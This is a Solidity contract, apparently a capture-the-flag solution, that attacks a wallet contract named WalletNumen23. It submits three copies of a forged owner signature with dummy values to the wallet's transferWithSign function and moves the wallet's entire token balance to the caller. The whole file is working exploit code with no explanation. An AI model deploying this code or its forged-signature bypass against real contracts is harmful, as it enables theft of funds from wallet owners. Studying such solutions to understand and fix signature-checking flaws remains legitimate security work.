// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
import "./Wallet.sol";

contract WalletNumen23Attack {
    
    function attack(address target) public {
        SignedByowner memory sign = SignedByowner(Holder(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, "attack", true, "0"), Signature(1, [bytes32("1"), bytes32("2")]));
        SignedByowner[] memory signs = new SignedByowner[](3);

        for(uint i = 0; i < signs.length; i++) {
            signs[i] = sign;
        }
        WalletNumen23 nw = WalletNumen23(target);
        NCNumen23 nc = NCNumen23(nw.token());
        nw.transferWithSign(msg.sender, nc.balanceOf(target), signs);
    }
}
